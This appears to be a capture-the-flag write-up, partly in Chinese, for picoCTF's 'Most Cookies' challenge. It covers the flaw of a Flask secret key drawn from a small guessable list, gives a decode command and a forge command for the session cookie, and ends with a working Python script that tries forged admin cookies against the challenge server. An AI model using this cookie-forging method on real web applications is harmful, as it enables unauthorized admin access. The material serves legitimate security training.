# Most Cookies 15
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! server.py http://mercury.picoctf.net:44693/

# Explore
提示flask cookie，考虑伪造cookie，app.py列出了所有可能的keys：
```python
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter",
                "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop",
                "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie",
                "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)
```
用[flask的cookie伪造工具](https://github.com/noraj/flask-session-cookie-manager)解密现有cookie，得到cookie的结构
>$\>python flask_session_cookie_manager3.py decode -c "eyJ2ZXJ5X2F1dGgiOiJkcm9wIn0.YO0fNw.s0d6wdes88v_E2JodXrylMWa9Rw"  
b'{"very_auth":"drop"}'

用所有可能的密钥伪造admin的cookie：
>python flask_session_cookie_manager3.py encode -s "keys" -t "{'very_auth': 'admin'}"  

# Exploit
用所有组合跑一遍，得到flag
```python
import requests
import time

l = '''eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YO0mNg.WWvJyGIFFiGJr90RFTdvFNa7Uac
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YO0mNg.DQFI-a3sk3qUbWdDtNfC1w9vwUE
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YO0mNw.sPkasj7E-hoEaWDtJkB-7TQgRbA
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YO0mNw.Gz8TNdxkwJLOtU7maHxH95ZsreY
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YO0mNw.98GbQY7HUbfpuXZIlqWQy0ED9Tc
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YO0mNw.viaIJhS2kwZvZpj1C8iPAnelrWE
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YO0mNw.tS4IefF_3dmXWlf3SHbpKys0QSg
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YO0mOA.0fGbPO628Y06Y9WIsjVqT_JLQAA
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YO0mOA.WT7i_DUgtUd_h1_e_ndZKDmylqQ
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YO0mOA.mkq9KrnfcwWk9iKLcsq_PAnBeLM
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YO0mOA.nLnjQUVhhmYxctu150UrXCoFTTQ
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YO0mOA.aVB1a55dWyOa6HxJQsmX_ThblcU
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YO0mOQ.8Kzswqe8cWRk4pXz27CHu54XFzI
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YO0mOQ.81FC_E8IFKGAM02x35tUTvycwfY
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YO0mOg.E20wJV-6N1E8iLPX0uagVAMSnus
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YO0mOw.XM64hKgPaGnSqRUHznppP1iKqjk
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YO0mOw.th9jE1s_bH5t-h2JTMONqioLgug
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YO0mOw.awlMEZcDUtcF_GB5s0DZeQkfERQ
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YO0mOw.EQKHBnx0j7H72iaggU8DrL-BT_o
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YO0mOw.Bm6BDa9qWXKRoJ2tb6nmxD0AHCw
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YO0mPA.73cg7lHIkmqIf7QowFhoi9uQC8w
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YO0mPA._CdY6fdQGPwVDUr-XJhtMrH_PXw
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YO0mPA.M7yQEpkRy7KSi_5Vki6gSDBGhBg
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YO0mPA.qAN7lSBklkysCPpu6qbu0Ll1YLA
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YO0mPA.X5Xuxy-Q39YQmxpLEPwqUHX0qr0
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YO0mPQ.nFq3asKxMexSCyXlvCCASmHd2OI
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YO0mPQ.N_yJEL53blPXlkwaLusjDKgdTvE
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YO0mPQ.gRlw80Df1h2vWDN5GO9y0vKan5s'''

for i in l.split("\n"):
    r = requests.get("http://mercury.picoctf.net:44693/display", headers={
        "Cookie": "session=" + i})
    if not "Welcome" in r.text:
        print(r.text)
        exit(0)
```